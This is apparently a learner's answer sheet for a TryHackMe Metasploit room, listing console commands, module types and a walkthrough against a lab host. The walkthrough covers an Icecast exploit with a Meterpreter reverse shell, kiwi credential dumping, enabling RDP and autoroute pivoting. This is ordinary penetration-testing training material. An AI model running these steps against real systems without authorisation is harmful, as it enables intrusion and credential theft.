# Metasploit

[rp-metasploit](https://tryhackme.com/room/rpmetasploit)

## Summary

1. Metasploit is a penetration testing tool (preinstalled in Kali)

## Solutions

1. Install Metasploit

   1. Install from [metasploit github repo](https://github.com/rapid7/metasploit-framework)

2. Initialize

   1. `msfdb init`
   2. `msfconsole -h`
   3. `-q`
   4. `msfconsole`
   5. `db_status`
   6. `postgressql`

3. Commands

   1. `help`
   2. `?`
   3. `search`
   4. `use`
   5. `info`
   6. `connect`
   7. `banner`
   8. `set`
   9. `setg`
   10. `get`
   11. `unset`
   12. `spool`
   13. `save`

4. Modules

   1. `exploit`
   2. `payload`
   3. `auxiliary`
   4. `post`
   5. `encoder`
   6. `nop`
   7. `load`

5. Exploit

   1. `db_nmap -sV 10.10.193.197`
   2. `msrpc`
   3. `hosts`
   4. `services`
   5. `vulns`
   6. `exploit/windows/http/icecast_header`
   7. `#`
   8. `use 6`
   9. `set payload windows/meterpreter/reverse_tcp`, `set lhost <host from ip addr>`
   10. `use icecast`
   11. `set rhost <box ip>`
   12. `run -j`
   13. `jobs`
   14. `sessions -i <first session in sessions>`

6. Post exploit modules

   1. `ps | grep spool` -> spoolsv.exe
   2. `migrate`
   3. `getuid`
   4. `sysinfo`
   5. `load kiwi`
   6. `getprivs`
   7. `upload`
   8. `run`
   9. `ipconfig`
   10. `run post/windows/gather/checkvm`
   11. `run post/multi/recon/local_exploit_suggester`
   12. `run post/windows/manage/enable_rdp`
   13. `shell`

7. Autoroute

   1. `run autoroute -s 172.18.1.0 -n 255.255.255.0`
   2. `auxiliary/server/socks4a`
   3. `proxychains`
